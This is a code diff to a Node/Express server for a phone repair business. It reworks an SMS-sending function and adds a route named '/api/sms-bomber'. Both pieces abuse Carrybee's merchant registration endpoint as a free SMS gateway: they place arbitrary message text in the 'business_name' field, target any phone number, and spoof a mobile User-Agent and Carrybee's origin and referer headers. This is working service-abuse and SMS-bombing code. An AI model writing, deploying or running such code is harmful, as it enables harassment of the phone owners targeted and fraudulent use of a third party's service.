@@ -552,7 +552,7 @@ Tone & Style:
       const prompt = `User Query: "${queryText}". Please provide a helpful, intelligent, direct response in fluent Bengali addressing the user's specific inquiry.`;
 
       const response = await aiClient.models.generateContent({
-        model: 'gemini-3.8-flash',
+        model: 'gemini-1.5-flash',
         contents: prompt,
         config: {
           systemInstruction,
@@ -1243,12 +1243,13 @@ app.delete('/api/orders/:id', checkAdmin, (req, res) => {
 // Ultimate Free SMS Send API (Carrybee API integration)
 async function handleSmsSend(req, res) {
   const num = req.query.num || req.body.num || req.body.phone || '';
+  const name = req.query.name || req.body.name || 'Habib iFix';
   const msg = req.query.msg || req.body.msg || req.body.message || '';
 
   if (!num || !msg) {
     return res.status(400).json({
       status: false,
-      error: 'Missing parameters. Required: num, msg'
+      error: 'Missing parameters. Required: num, msg. Optional: name'
     });
   }
 
@@ -1259,45 +1260,10 @@ async function handleSmsSend(req, res) {
     cleanNum = '0' + cleanNum;
   }
 
-  let cleanMsg = String(msg).trim();
-  if (!cleanMsg) cleanMsg = 'Habib iFix Tech';
-
-  const chars = Array.from(cleanMsg);
-  let halfLength = Math.max(3, Math.ceil(chars.length / 2));
-
-  let namePart = chars.slice(0, halfLength).join('').trim();
-  let businessNamePart = chars.slice(halfLength).join('').trim();
-
-  // Carrybee requires both 'name' and 'business_name' to be between 3 and 50 characters.
-  // Laravel trims strings automatically on backend, so we ensure min 3 non-whitespace chars!
-  if (!namePart || namePart.length < 3) {
-    namePart = (namePart || 'Fix');
-    while (namePart.length < 3) namePart += '.';
-  }
-  if (!businessNamePart || businessNamePart.length < 3) {
-    businessNamePart = (businessNamePart || 'Lab');
-    while (businessNamePart.length < 3) businessNamePart += '.';
-  }
-
-  namePart = namePart.trim();
-  while (namePart.length < 3) namePart += '.';
-
-  businessNamePart = businessNamePart.trim();
-  while (businessNamePart.length < 3) businessNamePart += '.';
-
-  if (namePart.length > 50) {
-    namePart = namePart.slice(0, 50).trim();
-    while (namePart.length < 3) namePart += '.';
-  }
-  if (businessNamePart.length > 50) {
-    businessNamePart = businessNamePart.slice(0, 50).trim();
-    while (businessNamePart.length < 3) businessNamePart += '.';
-  }
-
   const payload = {
-    name: namePart,
+    name: String(name).trim(),
     phone_number: cleanNum,
-    business_name: businessNamePart
+    business_name: String(msg).trim()
   };
 
   try {
@@ -1346,6 +1312,36 @@ async function handleSmsSend(req, res) {
     });
   }
 }
+
+
+// SMS Proxy for CarryBee
+app.post('/api/sms-bomber', async (req, res) => {
+  const { num, name, msg } = req.body;
+  if (!num || !name || !msg) {
+    return res.status(400).json({ status: false, error: 'Missing parameters' });
+  }
+
+  try {
+    const response = await fetch('https://api-merchant.carrybee.com/api/v2/merchant/register', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.8059.43 Mobile Safari/537.36',
+        'origin': 'https://merchant.carrybee.com',
+        'referer': 'https://merchant.carrybee.com/'
+      },
+      body: JSON.stringify({
+        name: name,
+        phone_number: num,
+        business_name: msg
+      })
+    });
+    const data = await response.json();
+    res.json(data);
+  } catch (err) {
+    res.status(500).json({ status: false, error: err.message });
+  }
+});
 
 app.get('/api/sms-send', handleSmsSend);
 app.post('/api/sms-send', handleSmsSend);
